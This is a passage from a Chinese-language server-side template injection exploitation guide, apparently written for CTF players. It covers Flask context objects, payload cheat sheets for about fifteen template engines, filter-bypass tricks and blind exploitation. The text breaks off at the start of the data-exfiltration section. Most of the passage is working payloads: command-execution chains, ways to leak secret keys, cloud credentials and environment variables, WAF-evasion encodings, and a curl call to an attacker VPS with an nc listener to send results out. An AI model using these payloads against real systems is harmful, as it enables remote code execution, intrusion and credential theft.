 **新手避坑**：Jinja2 沙箱过滤的是属性访问，不是字符串过滤。如果在 `SandboxedEnvironment` 中，即使 `__class__` 没有被 WAF 拦截，也会在运行时被沙箱阻止，报错类似 `access to attribute '__class__' is unsafe`。此时需要通过不被沙箱阻止的路径来绕过。

---

## 第4章：Flask 上下文对象详解

本章专门针对 Flask + Jinja2 场景，详细解读每个常见上下文对象的属性和可利用入口。

### 4.1 config 对象

`config` 是 Flask 应用的配置对象，继承自 `dict`。

```jinja2
# 查看所有配置项
{{config}}

# 读取特定配置
{{config["SECRET_KEY"]}}
{{config.SECRET_KEY}}
{{config.get("SECRET_KEY")}}

# 枚举所有键值对
{% for k, v in config.items() %}
{{k}} = {{v}}
{% endfor %}

# config 对象本身也是 Python 对象
{{config.__class__}}
{{config.__class__.__init__.__globals__}}
```

**可能泄露的敏感配置**：
- `SECRET_KEY`：Flask Session 签名密钥
- `SQLALCHEMY_DATABASE_URI`：数据库连接字符串
- `MAIL_PASSWORD`：邮件服务密码
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`：云服务密钥
- `REDIS_URL`：Redis 连接
- `DEBUG`：是否开启调试模式

### 4.2 request 对象

`request` 是 Flask 的请求对象，封装了当前 HTTP 请求的所有信息。

```jinja2
# 请求方法
{{request.method}}

# 请求参数
{{request.args}}           # GET 参数
{{request.form}}           # POST 表单
{{request.values}}         # GET + POST 合并
{{request.json}}           # JSON 体
{{request.data}}           # 原始请求体

# 请求头
{{request.headers}}
{{request.headers.get("User-Agent")}}
{{request.headers.get("Cookie")}}

# Cookie
{{request.cookies}}

# URL 信息
{{request.url}}
{{request.path}}
{{request.host}}
{{request.remote_addr}}

# WSGI 环境
{{request.environ}}

# Flask 应用对象（重要入口）
{{request.application}}
{{request.application.__globals__}}
```

**利用价值**：
- `request.args` 和 `request.headers` 可以传递字符串值到 payload 中，避免直接在 payload 中写引号或关键字。
- `request.application` 可以访问 Flask 应用对象的全局变量。

**request 的完整属性列表**：

```jinja2
{{request.method}}           # GET / POST
{{request.args}}             # 查询参数
{{request.args.get("x")}}    # 取指定 GET 参数
{{request.args.keys()}}      # 所有 GET 参数名
{{request.form}}             # 表单数据
{{request.form.get("x")}}
{{request.form.keys()}}
{{request.values}}           # args + form 合并
{{request.json}}             # JSON 体（已解析）
{{request.data}}             # 原始请求体 bytes
{{request.headers}}          # 请求头
{{request.headers.get("Host")}}
{{request.headers.get("User-Agent")}}
{{request.cookies}}          # Cookie
{{request.cookies.get("session")}}
{{request.url}}              # 完整 URL
{{request.base_url}}         # 不带查询参数的 URL
{{request.url_root}}         # 根 URL
{{request.path}}             # 路径部分
{{request.host}}             # 主机名
{{request.host_url}}         # 主机 URL
{{request.remote_addr}}      # 客户端 IP
{{request.environ}}          # WSGI 环境（含所有环境变量）
{{request.environ["PATH_TRANSLATED"]}}
{{request.environ["SERVER_SOFTWARE"]}}
{{request.environ["REMOTE_ADDR"]}}
{{request.application}}      # Flask 应用对象
```

**利用 request.environ 泄露敏感信息**：

```jinja2
{{request.environ}}
{{request.environ.get("AWS_SECRET_ACCESS_KEY")}}
{{request.environ.get("FLAG")}}
{{request.environ.get("SECRET_KEY")}}
{{request.environ.get("DB_PASSWORD")}}
```

WSGI 环境变量中经常含有系统环境变量和框架配置，是最容易被忽略的信息泄露源之一。

### 4.3 session 对象

`session` 是 Flask 的会话对象，基于 Cookie 存储。

```jinja2
{{session}}
{{session.items()}}
{{session.get("user")}}
{{session.get("role")}}
```

**利用价值**：
- 查看当前会话中存储的用户信息。
- 如果知道了 `SECRET_KEY`，可以伪造任意 session。

### 4.4 g 对象

`g` 是 Flask 的应用上下文全局对象，用于在单个请求中存储临时数据。

```jinja2
{{g}}
{{g.__dict__}}
{% if g.user %}
  {{g.user}}
{% endif %}
```

**常见应用场景**：许多 Flask 应用会在 `g` 对象上存储当前用户信息、数据库连接、配置覆盖等。如果应用使用了 `@app.before_request` 钩子将用户对象挂载到 `g` 上，就能通过 `g.user` 或 `g.current_user` 访问用户数据。

### 4.5 url_for 函数

`url_for` 是 Flask 的 URL 生成函数。

```jinja2
{{url_for}}
{{url_for.__globals__}}
```

**利用价值**：
- `url_for.__globals__` 可能包含 Flask 应用对象的引用，进而访问到 `__builtins__`。

```jinja2
{{url_for.__globals__["current_app"].config}}
{{url_for.__globals__["os"].popen("id").read()}}
```

**url_for 利用详解**：

```jinja2
# 通过 url_for 的 __globals__ 探索
{{url_for.__globals__.keys()}}

# 检查是否有 os
{% if url_for.__globals__.get("os") %}
  可以直接用 os!
{% endif %}

# 通过 __builtins__ 间接导入 os
{% if url_for.__globals__.get("__builtins__") %}
  {{url_for.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
{% endif %}
```

`url_for` 被定义在 Flask 应用的某个模块中，因此它的 `__globals__` 属性会包含该模块的所有全局导入，包括可能已经导入的 `os`、`sys`、`__builtins__` 等。

### 4.6 get_flashed_messages 函数

```jinja2
{{get_flashed_messages}}
{{get_flashed_messages.__globals__}}

# 查看其全局变量中的可用键
{{get_flashed_messages.__globals__.keys()}}

# 如果 os 已导入
{{get_flashed_messages.__globals__.get("os")}}

# 通过 builtins
{{get_flashed_messages.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
```

`get_flashed_messages` 是 Flask 的辅助函数，定义在 `flask.helpers` 模块中。通过它的 `__globals__` 可以访问 Flask 内部的模块全局变量。

### 4.7 其他 Jinja2 内置全局对象

```jinja2
# Jinja2 内置的全局函数
{{range(10)}}                    # range 函数
{{lipsum()}}                     # Lorem Ipsum 生成
{{dict(a=1, b=2)}}               # 字典创建

# Jinja2 内置的全局类
{{cycler.__doc__}}               # cycler 类文档
{{joiner.__doc__}}               # joiner 类文档
{{namespace().__doc__}}          # namespace 实例

# 通过内置函数访问 globals
{{lipsum.__globals__.keys()}}
```

### 4.8 自定义上下文处理器

Flask 允许通过 `@app.context_processor` 向模板注入额外变量，审计时要注意：

```python
@app.context_processor
def inject_helpers():
    return dict(
        db=db,
        cache=cache,
        admin_check=check_admin,
    )
```

这些自定义对象如果暴露了危险方法，可能成为利用入口。

**审计自定义上下文处理器的关注点**：

```python
# 危险的自定义上下文
@app.context_processor
def inject_dangerous():
    return dict(
        # 直接暴露 os 模块——立刻 RCE
        os=os,

        # 暴露 open 函数——可直接读文件
        read_file=open,

        # 暴露 eval——任意代码执行
        eval=eval,

        # 暴露数据库对象——可查任意数据
        db=db,
        execute_sql=db.execute,
    )
```

### 4.9 通过 Flask 内置对象传递字符串值

当 payload 中需要字符串但引号被过滤时，利用 Flask 请求对象从请求参数中取值：

```jinja2
# 通过 GET 参数传属性名
{{()|attr(request.args.a)}}&a=__class__

# 通过 Cookie 传值
{{()|attr(request.cookies.a)}}&a=
Cookie: a=__class__

# 通过请求头传值
{{()|attr(request.headers["X-A"])}}
X-A: __class__

# 通过 POST 表单传值
{{config[request.form.k]}}
(k=SECRET_KEY 在 POST body 中)

# 通过 JSON 体（需 request.json 可用）
{{config[request.json.k]}}
{"k": "SECRET_KEY"}
```

这种技巧在各种引号过滤场景下非常实用，等于把"写死在 payload 中的字符串"变成了"从请求中动态获取"。

---

## 第5章：其他模板引擎速查

### 5.1 Mako（Python）

**定界符**：`${...}`、`<% ... %>`

**基础测试**：

```mako
${7*7}
${"ssti".upper()}
```

**文件读取（无需对象链）**：

```mako
${open("/flag").read()}
${open("/flag.txt").read()}
${open("/etc/passwd").read()}
```

**命令执行**：

```mako
${__import__("os").popen("id").read()}
${__import__("os").popen("cat /flag").read()}
```

**代码块方式**：

```mako
<%
import os
result = os.popen("id").read()
%>
${result}
```

**Mako 模板的代码块更强大**，不仅限于 `${}`，还可以执行多行 Python 代码：

```mako
<%
import subprocess
result = subprocess.check_output(["id", "--help"], text=True)
%>
<pre>${result}</pre>
```

**利用 Mako 的 `<%include>` 读取文件**：

```mako
<%include file="/etc/passwd"/>
```

注意：`<%include>` 能否读取任意路径取决于 Mako 的模板查找器配置。

**Mako 上下文枚举**：

```mako
${self}
${self.attr}
${context.keys()}
```

 **避坑**：Mako 比 Jinja2 更接近"直接执行 Python"，确认后优先试 `open()` 和 `__import__`，不用走对象链。

 **避坑**：`<%` 代码块在 Mako 中可以执行任意 Python，如果 `${}` 被过滤，代码块可能是更稳定的选择。

### 5.2 Tornado Template（Python）

**定界符**：`{{ ... }}`、`{% ... %}`

**基础测试**：

```tornado
{{7*7}}
{{"ssti".upper()}}
```

**命令执行（支持 `import` 语句）**：

```tornado
{% import os %}
{{os.popen("id").read()}}
```

**文件读取**：

```tornado
{{open("/flag").read()}}
```

**Tornado 与 Jinja2 的关键区别**：

| 特性 | Tornado | Jinja2 |
|------|---------|--------|
| import 语句 | 原生支持 `{% import %}` | 不支持 |
| 表达式计算 | `{{7*7}}` 直接执行 | 直接执行 |
| 字符串乘法 | 支持 | 支持 |
| `{% set %}` | `{% set x = 1 %}` | `{% set x = 1 %}` |
| 自动转义 | 默认开启 | 默认开启（Flask 配置） |

**利用多个 import**：

```tornado
{% import subprocess %}
{{subprocess.check_output("id", shell=True).decode()}}

{% import os %}
{% import sys %}
{{os.popen("python --version").read()}}
```

 **避坑**：Tornado 模板支持 `{% import %}` 语句，这是与 Jinja2 的重要区别。在 Jinja2 中 `{% import %}` 语法不同，不能混用。

### 5.3 Twig（PHP）

**定界符**：`{{ ... }}`、`{% ... %}`

**基础测试**：

```twig
{{7*7}}
{{7*"7"}}    # 返回 49（区别于 Jinja2 的 7777777）
{{"ssti"|upper}}
```

**上下文枚举**：

```twig
{{_context}}
{{_context|json_encode}}
{{app}}
{{app.request}}
{{app.request.server.all}}
```

**旧版回调利用（Twig 1.x）**：

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

**map 回调利用（部分版本）**：

```twig
{{["id"]|map("system")|join}}
{{["cat /flag"]|map("passthru")|join}}
{{["cat /flag"]|map("shell_exec")|join}}
```

**利用 `sort` 过滤器回调**：

```twig
{{["id"]|sort("system")}}
```

**文件读取（有限制）**：

```twig
{{source("index.html")}}
{{include("index.html")}}
```

**Twig 版本差异速查**：

| 利用方法 | Twig 1.x | Twig 2.x | Twig 3.x |
|----------|----------|----------|----------|
| `_self.env` | 可用 | 不可用 | 不可用 |
| `map("system")` | 部分环境 | 部分环境 | 有限制 |
| `sort("system")` | 部分环境 | 部分环境 | 有限制 |
| Sandbox 默认启用 | 不启用 | 新项目启用 | 默认启用 |

 **避坑**：
- Twig 1.x、2.x、3.x 利用链差异很大，`_self.env` 在 2.x+ 已不可用。
- `map("system")` 可用性取决于 SandboxExtension 和是否允许字符串 callable。
- 区分 Twig 和 Jinja2 最简单的方法：`{{7*"7"}}`，Twig 返回 49，Jinja2 返回 7777777。

### 5.4 Smarty（PHP）

**定界符**：`{ ... }`、`{$var}`

**版本指纹**：

```smarty
{$smarty.version}
{$smarty.template}
{$smarty.current_dir}
{$smarty.now}
```

**PHP 函数调用**：

```smarty
{system("id")}
{file_get_contents("/flag")}
{readfile("/flag")}
{passthru("id")}
{exec("id")}
```

**if 语句调用**：

```smarty
{if system("id")}{/if}
{if file_get_contents("/flag")}{/if}
```

**旧版 php 标签（SmartyBC）**：

```smarty
{php}
echo file_get_contents("/flag");
{/php}
```

**Smarty 自带函数**：

```smarty
{fetch file="file:///etc/passwd"}
{include file="/path/to/template.tpl"}
```

**Smarty 安全模式影响**：

| 功能 | 安全模式关闭 | 安全模式开启 |
|------|-------------|-------------|
| `{system()}` | 可用 | 被阻止 |
| `{php}` 标签 | 可用 | 被阻止 |
| `{fetch}` | 可用 | 受限 |
| `$smarty.version` | 可用 | 可用 |

 **避坑**：`{php}` 标签在现代 Smarty 默认禁用，需确认目标使用旧版本或 SmartyBC 兼容模式。

 **避坑**：Smarty 的定界符 `{` 和 `}` 可能与其他 JavaScript 框架冲突，页面中可能存在大量花括号，需要仔细寻找注入点的确切位置。

### 5.5 FreeMarker（Java）

**定界符**：`${...}`、`<#...>`

**基础测试**：

```freemarker
${7*7}
${"ssti"?upper_case}
${"ssti"?length}
${.now}
```

**Execute 利用**：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# 一行
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
```

**其他危险类**：

```freemarker
# ObjectConstructor（可以实例化任意类）
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
${oc("java.lang.ProcessBuilder", "id")}

# Jython 执行（如果可用）
<#assign ju="freemarker.template.utility.JythonRuntime"?new()>
```

**枚举数据模型**：

```freemarker
<#list .data_model?keys as key>
${key} = ${.data_model[key]}
</#list>

<#list .globals?keys as key>
${key}
</#list>
```

**FreeMarker 安全配置**：

`freemarker.core.Configurable` 中的 `template_class_resolver` 控制哪些类可以被 `?new()` 实例化：

| 解析器策略 | 行为 |
|-----------|------|
| `UNRESTRICTED_RESOLVER` | 允许所有类（危险） |
| `SAFER_RESOLVER` | 阻止已知危险类 |
| `ALLOW_NOTHING_RESOLVER` | 完全禁止实例化 |
| 自定义解析器 | 由开发者定义规则 |

 **避坑**：`freemarker.template.utility.Execute` 可能被 `TemplateClassResolver` 禁止，报错 `is not allowed` 表示此路不通。此时可以尝试 `ObjectConstructor` 或寻找其他入口。

 **避坑**：`<#assign>` 和 `?new()` 是 FreeMarker 特有的语法，不要在其他模板引擎中尝试。

### 5.6 Thymeleaf（Java / Spring）

**定界符**：`${...}`、`*{...}`、`#{...}`

**基础测试**：

```thymeleaf
${7*7}

# 预处理表达式（Spring 中常见漏洞场景）
__${7*7}__::.x
```

**读文件（Java NIO）**：

```thymeleaf
__${new java.lang.String(
T(java.nio.file.Files).readAllBytes(
T(java.nio.file.Paths).get("/flag")
))}__::.x
```

**命令执行**：

```thymeleaf
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# 命令执行+读取输出（使用 Scanner）
__${new java.util.Scanner(
T(java.lang.Runtime).getRuntime().exec("id").getInputStream()
).useDelimiter("\\A").next()}__::.x
```

**读取环境变量**：

```thymeleaf
__${T(java.lang.System).getenv()}__::.x
```

**Thymeleaf 视图名称控制**：

Thymeleaf SSTI 常见的触发方式不是用户直接控制模板内容，而是用户控制视图名称（通过 Spring MVC 的返回值）。例如：

```java
@GetMapping("/view")
public String view(HttpServletRequest req) {
    return req.getParameter("view");  // 危险！
}
```

此时请求 `?view=__${7*7}__::.x` 会导致模板注入。

 **避坑**：
- 用户输入仅作为变量值时 `${7*7}` 不会二次执行，需控制模板名或视图名。
- `T(...)` 和 `new` 经常被安全策略限制。
- Thymeleaf 的预处理表达式 `__${...}__` 在 Spring Boot 2.x+ 版本中默认不启用。
- `::.x` 后缀用于告诉 Thymeleaf 这是一个视图片段表达式。

### 5.7 EJS（Node.js）

**定界符**：`<%= ... %>`、`<%- ... %>`、`<% ... %>`

**基础测试**：

```ejs
<%= 7*7 %>
<%= "ssti".toUpperCase() %>
<%= [1,2,3].map(x => x*2) %>
```

**读文件**：

```ejs
<%= require("fs").readFileSync("/flag", "utf8") %>

# 通过 process.mainModule
<%= global.process.mainModule.require("fs").readFileSync("/flag", "utf8") %>

# 通过 process.getBuiltinModule（Node.js 16+）
<%= process.getBuiltinModule("fs").readFileSync("/flag", "utf8") %>
```

**命令执行**：

```ejs
<%= require("child_process").execSync("id").toString() %>

# 通过 process.mainModule
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>

# 异步 exec 的同步写法
<%= require("child_process").execFileSync("cat", ["/flag"]).toString() %>
```

**其他 Node.js 入口**：

```ejs
# 通过 global
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>

# 通过 process.binding（仅限部分版本）
<%= process.binding("spawn_sync") %>
```

**读取环境变量**：

```ejs
<%= JSON.stringify(process.env) %>
<%= process.env.FLAG %>
```

**EJS 的 `delimiter` 选项**：

EJS 允许自定义定界符，当默认的 `<%` 被过滤时可能改为其他符号：

```javascript
// 服务端代码
ejs.render(input, { delimiter: '?' })
// 此时可以用 <?= 7*7 ?> 注入
```

 **避坑**：`process.mainModule` 在 ESM 模式或新版本 Node.js 中可能为 `null`，备选 `process.getBuiltinModule()`。

 **避坑**：EJS 的 `<%` 标签执行代码但不输出，`<%=` 输出 HTML 转义结果，`<%-` 输出原始结果。读文件和执行命令时应使用 `<%=` 确保输出可见。

### 5.8 ERB（Ruby）

**定界符**：`<%= ... %>`、`<% ... %>`

**基础测试**：

```erb
<%= 7*7 %>
<%= RUBY_VERSION %>
<%= RUBY_PLATFORM %>
<%= defined?("a".upcase) %>
```

**读文件**：

```erb
<%= File.read("/flag") %>
<%= File.read("/etc/passwd") %>

# 读取目录
<%= Dir.entries("/") %>
```

**读环境变量**：

```erb
<%= ENV.to_h %>
<%= ENV["FLAG"] %>
```

**命令执行（反引号）**：

```erb
<%= `id` %>
<%= `cat /flag` %>
```

**命令执行（%x 语法）**：

```erb
<%= %x(id) %>
<%= %x(cat /flag) %>
```

**命令执行（IO.popen）**：

```erb
<%= IO.popen("id").read %>
<%= IO.popen("cat /flag").read %>
```

**上下文枚举**：

```erb
<%= local_variables %>
<%= instance_variables %>
<%= self %>
<%= methods.sort %>
```

**Ruby 的 `binding` 对象**：

```erb
<%= binding.local_variables %>
<%= binding.eval("7*7") %>
```

 **避坑**：反引号在 Markdown 中容易被误解，可用 `%x()` 代替。

 **避坑**：ERB 渲染时如果没有传入 `binding`，某些方法可能不可用。`binding` 控制着模板中可以访问哪些变量。

### 5.9 Go Template

**定界符**：`{{ ... }}`

Go 标准模板能力受限，不支持直接算术表达式。

**基础测试（不能用 {{7*7}}，会报错）**：

```go-template
{{printf "%s" "ssti"}}
{{len "hello"}}
{{printf "%T" .}}
{{print "ssti"}}
```

**枚举数据**：

```go-template
{{.}}
{{printf "%#v" .}}

# map 遍历
{{range $k,$v := .}}{{$k}}={{$v}}
{{end}}

# 结构体字段访问
{{.Username}}
{{.Config.SecretKey}}
```

**调用注册函数（依赖 FuncMap）**：

```go-template
{{readFile "/flag"}}
{{run "id"}}
{{exec "cat /flag"}}
```

**条件判断**：

```go-template
{{if .IsAdmin}}Admin{{else}}User{{end}}
```

**管道链**：

```go-template
{{"ssti" | printf "%s"}}
{{. | json}}
```

**Go template 与传统模板的关键差异**：

| 能力 | Go template | Jinja2 / Twig |
|------|-------------|---------------|
| 算术表达式 | 不支持 | 支持 |
| 属性访问 | 仅导出字段 | 全部属性 |
| 方法调用 | 仅导出方法（无参或 FuncMap） | 全部方法 |
| 函数调用 | 仅内置+FuncMap | 内置+上下文 |
| 字符串拼接 | `printf "%s%s" "a" "b"` | `~` 操作符 |
| 沙箱 | 设计上受限 | 可选 SandboxedEnvironment |

 **避坑**：
- Go 模板只能调用内置函数、数据对象导出字段和 `FuncMap` 注册函数，不注册危险函数则无法 RCE。
- Pongo2（第三方 Go 模板）语法类似 Jinja2，支持 `{{7*7}}`，不要和标准 `text/template` 混淆。
- `html/template` 和 `text/template` 的 API 兼容，但 `html/template` 会自动 HTML 转义输出。

### 5.10 Pug（Node.js）

**定界符**：`#{...}`、`- 代码`

**基础测试**：

```pug
#{7*7}
#{"ssti".toUpperCase()}
```

**命令执行**：

```pug
#{global.process.mainModule.require("child_process").execSync("id").toString()}
```

**读文件**：

```pug
#{global.process.mainModule.require("fs").readFileSync("/flag","utf8")}
```

**使用 `-` 代码块执行多行 JavaScript**：

```pug
-
const fs = require("fs")
const data = fs.readFileSync("/flag", "utf8")
= data
```

**Pug 的变量插值**：

```pug
p #{variable}    # 转义输出
p !{variable}    # 不转义输出
```

**危险 vs 安全**：

```javascript
// 危险：用户输入作为模板
const html = pug.render(userInput)

// 安全：用户输入作为变量值
res.render("index.pug", { name: userInput })
```

 **避坑**：Pug 用缩进表示结构，注入时注意换行和缩进。`res.render("index.pug", {name})` 安全，`pug.render(用户输入)` 危险。

 **避坑**：Pug 使用缩进语法，注入多行 payload 时需要注意格式。最简单的方式是使用 `#{...}` 单行表达式。

### 5.11 Nunjucks（Node.js）

**定界符**：`{{ ... }}`、`{% ... %}`（类似 Jinja2，但运行在 JS 环境）

**基础测试**：

```nunjucks
{{7*7}}
{{"ssti"|upper}}
```

**通过 constructor 到达 Function**：

```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

**其他入口**：

```nunjucks
# 通过 cycler 对象（如果可用）
{{cycler.constructor("return global.process.mainModule.require('fs').readFileSync('/flag','utf8')")()}}

# 通过对象的 constructor 链
{{[].constructor.constructor("return process.env")()}}
```

**Nunjucks 的 autoescape 设置**：

Nunjucks 默认自动转义（autoescape = true），但这不影响表达式执行，只影响输出格式。

 **避坑**：Nunjucks 不是 Jinja2，不能套用 Python 的 `__class__` 链。`range.constructor` 链依赖 `process.mainModule` 可用。

 **避坑**：Nunjucks 和 Jinja2 语法几乎相同，但一个运行在 Node.js（JavaScript），一个运行在 Python。确定后端语言后才能选择正确的利用链。

### 5.12 Handlebars（Node.js）

**定界符**：`{{ ... }}`

**只能枚举上下文，不能直接执行表达式**：

```handlebars
{{this}}
{{#each this}}{{@key}}={{this}}{{/each}}
```

**Handlebars 的利用条件**：

Handlebars 默认不支持任意表达式，`{{7*7}}` 不会执行计算。利用需要特殊条件：

```handlebars
# 如果注册了自定义 helper
{{readFile "/flag"}}
{{exec "id"}}

# 利用原型链污染
{{#with "constructor"}}
  {{#with "constructor"}}
    {{this.call(null, "return process.mainModule.require('child_process').execSync('id')")}}
  {{/with}}
{{/with}}
```

 **避坑**：Handlebars 默认不支持任意表达式，`{{7*7}}` 不返回 49 不代表没有注入。利用依赖自定义 Helper 或原型链漏洞，不能照搬 Jinja2 payload。

### 5.13 Django Template（Python）

**定界符**：`{{ ... }}`、`{% ... %}`

**基础测试**：

```django
{{7|add:"7"}}   # 加法过滤器，可能输出 14
{{"abcd"|length}}  # 4
```

Django Template 默认限制严格：不支持任意 Python 表达式、不能调用带参数的方法、不能访问下划线开头的属性。不要将 Jinja2 的 `__class__` 链直接套用到 Django Template。

**Django 与 Jinja2 语法对比**：

| 功能 | Django Template | Jinja2 |
|------|-----------------|--------|
| 属性访问 | `{{ obj.attr }}` | `{{ obj.attr }}` |
| 下标访问 | `{{ obj.0 }}` | `{{ obj[0] }}` |
| 过滤器 | `{{ var|filter }}` | `{{ var|filter }}` |
| 算术 | `{{ 7|add:"7" }}` | `{{ 7+7 }}` |
| `__class__` 访问 | 默认禁止 | 默认允许（沙箱外） |
| 方法调用 | 仅无参方法 | 均可调用 |

 **避坑**：Django Template 中的 SSTI 能否利用，完全取决于自定义过滤器和标签中暴露的危险功能，不存在通用 RCE 链。

### 5.14 Velocity（Java）

**定界符**：`$变量`、`#指令`

**基础测试**：

```velocity
#set($x=7*7)$x
```

**枚举常见对象**：

```velocity
$request
$response
$session
$application
$class
$ctx
```

**利用 ClassTool**（如果可用）：

```velocity
#set($rt = $class.inspect("java.lang.Runtime").type)
#set($pr = $rt.getRuntime().exec("id"))
```

**使用 exec**：

```velocity
#set($str = $class.inspect("java.lang.StringBuilder").type)
#set($cmd = $str.newInstance())
#set($null = $cmd.append("id"))
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
$runtime.exec($cmd.toString())
```

 **避坑**：`$class` 不是所有 Velocity 环境的默认变量。若 `$class` 原样输出或为空，则该对象未加入上下文。Velocity 利用的关键是先枚举上下文对象和工具类，而非照搬固定反射 payload。

### 5.15 Blade（Laravel / PHP）

**定界符**：`{{ ... }}`、`@指令`

Blade 是 Laravel 默认模板引擎。

```blade
{{7*7}}           # Blade 中会被转义输出，不计算
{!! 7*7 !!}       # 不转义输出，但仍然不计算表达式
```

Blade 的 `{{ }}` 语法默认输出经过 htmlspecialchars 处理的变量值，不会执行任意表达式。真正危险的是 `Blade::compileString()` 方法：

```php
echo Blade::compileString("Hello " . $userInput);
```

 **避坑**：Blade 模板中的 `{{ }}` 默认是安全的（输出经过转义）。SSTI 只在直接调用 `Blade::compileString()` 且用户控制模板源码时才出现。

---

## 第6章：绕过过滤

### 6.1 点号过滤

```jinja2
# 原写法
{{obj.__class__}}

# 方式1：方括号
{{obj["__class__"]}}

# 方式2：attr 过滤器
{{obj|attr("__class__")}}

# 方式3：点号+方括号混合
{{obj["__class__"].__base__}}

# 链式使用
{{obj|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}
```

### 6.2 方括号过滤

```jinja2
# 改用点号
{{config.SECRET_KEY}}

# 改用 attr
{{cycler|attr("__init__")|attr("__globals__")}}

# 使用 pop 方法访问字典
{{config.pop("SECRET_KEY")}}
```

### 6.3 下划线 / 关键字过滤

**方法1：使用 `request.args` 传值**

```text
GET /?name={{()|attr(request.args.a)}}&a=__class__
```

多层：

```text
GET /?name={{()|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__base__
```

**方法2：字符串拼接（`~` 操作符）**

```jinja2
{{()|attr("__cla" ~ "ss__")}}
{{cycler.__init__.__globals__["o" ~ "s"].popen("id").read()}}
{{()|attr(("_"*2) ~ "class" ~ ("_"*2))}}
```

**方法3：十六进制转义**

```jinja2
{{()|attr("\x5f\x5fclass\x5f\x5f")}}
{{()|attr("\x5f\x5f\x62\x61se\x5f\x5f")}}
```

`\x5f` 对应下划线 `_`，能否绕过取决于过滤发生在模板解析前还是之后。

**方法4：使用 request 对象传递字符串**

```jinja2
{{()|attr(request.headers["X-A"]).__base__}}
```

```http
X-A: __class__
```

**方法5：Unicode 编码**

```jinja2
{{()|attr("__class__")}}
```

### 6.4 引号过滤

从请求参数或请求头中获取字符串值，避免在 payload 中直接写引号。

```jinja2
{{config[request.args.key]}}&key=SECRET_KEY
{{()|attr(request.headers["User-Agent"])}}
```

```http
User-Agent: __class__
```

**利用 Cookie 传递关键字**：

```jinja2
{{()|attr(request.cookies.a)}}
```

```http
Cookie: a=__class__
```

**利用 session 对象（如果可用）**：

```jinja2
{{()|attr(session.get("a"))}}
```

### 6.5 花括号过滤

如果 `{{` 被过滤但 `{% %}` 可用：

```jinja2
{% print 7*7 %}
{% set x = 7*7 %}{% print x %}
```

如果 `{% %}` 也被过滤，寻找二次渲染点或尝试其他输入位置。

### 6.6 文件名 / 路径过滤

将路径放在其他参数中传入：

```text
GET /?name={{cycler.__init__.__globals__.__builtins__["open"](request.args.p).read()}}&p=/flag
```

不依赖 `cat` 命令，直接用 Python `open()` 读文件。

**路径编码绕过**：

```jinja2
{{cycler.__init__.__globals__.__builtins__["open"]("/fl"~"ag").read()}}
{{cycler.__init__.__globals__.__builtins__["open"]("/fl\x61g").read()}}
```

### 6.7 空格过滤

在 Jinja2 中很多地方不需要空格：

```jinja2
{{7*7}}
{{config["SECRET_KEY"]}}
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

如果控制语句需要空格，尝试换行或 Tab：

```text
%09    Tab
%0a    换行
%0d    回车
```

### 6.8 多重编码绕过

**URL 单次编码**：

```
{{7*7}} → %7B%7B7*7%7D%7D
```

**URL 二次编码**：

```
{{7*7}} → %257B%257B7*7%257D%257D
```

**JSON Unicode 转义**：

```json
{"name": "{{7*7}}"}
```

**HTML 实体编码**（仅在极少场景有效）：

```
&#123;&#123;7*7&#125;&#125;
```

### 6.9 长度限制绕过

当输入长度受限时：

```jinja2
# 优先使用短对象名
{{lipsum.__globals__.os.popen("id").read()}}

# 将长字符串放在其他参数
{{lipsum.__globals__.__builtins__[request.args.f](request.args.p).read()}}&f=open&p=/flag

# 使用简短的命令
{{cycler.__init__.__globals__.os.popen("ls").read()}}
```

### 6.10 绕过技术总表

| 被过滤内容 | Jinja2 绕过方式 | Twig 绕过方式 |
|-----------|----------------|--------------|
| `.`（点号） | `["attr"]`、`\|attr()` | `["attr"]`、`\|attribute()` |
| `[]` | `.attr`、`\|attr()` | `.attr` |
| `_`（下划线） | `request.args` 传值、`\x5f` 转义 | `app.request` 传值 |
| `"`（引号） | `request.args.x` 取值 | `app.request.x` 取值 |
| `{{` | `{% print %}` | — |
| 关键字 | `~` 拼接、`\x` 转义 | `~` 拼接 |
| 空格 | 去掉多余空格 | 去掉多余空格 |

 **避坑**：
- 先确认过滤发生在哪个阶段（前端JS / WAF / 框架 / 模板引擎 / 输出层）。
- 每次只改变一个被过滤的位置，观察报错变化。
- 不存在万能绕过方法，要根据具体过滤规则组合使用。
- 关键字黑名单 ≠ 沙箱。黑名单可以通过编码/拼接绕过；沙箱在运行时限制属性访问。

---

## 第7章：无回显利用

### 7.1 延时验证

```jinja2
# Jinja2
{{cycler.__init__.__globals__.os.popen("sleep 5").read()}}

# Mako
${__import__("os").popen("sleep 5").read()}

# EJS
<%= require("child_process").execSync("sleep 5").toString() %>

# ERB
<%= `sleep 5` %>

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# Windows 目标（Jinja2）
{{cycler.__init__.__globals__.os.popen("ping -n 6 127.0.0.1").read()}}
```

多次对比正常请求的响应时间，排除网络抖动。

 **避坑**：延时判断至少测试3次取平均值，正常响应和延时响应的差异应在2秒以上才有说服力。

### 7.2 HTTP 外带

VPS 监听：

```bash
python3 -m http.server 8000
nc -lvnp 8000
```

```jinja2
{{cycler.__init__.__globals__.os.popen("curl http://VPS_IP:8000/ssti").read()}}
```

无 `curl` 时用 Python 标准库：

```jinja2
{{cycler.__init__.__globals__.__builtins__["__import__"]("urllib.request").request.urlopen("http://VPS_IP:8000/ssti").read()}}

# Python 3 urllib
{{cycler.__init__.__globals__.__builtins__["__import__"]("urllib.request").urlopen("http://VPS_IP:8000/ssti").read()}}
```

**写入到 Web 目录再读取**：

```jinja2
{{cycler.__init__.__globals__.os.popen("id > /var/www/html/result.txt").read()}}
```

### 7.3 数据外带

数据外带（Base64 编码防特殊字符）：

```jinja2
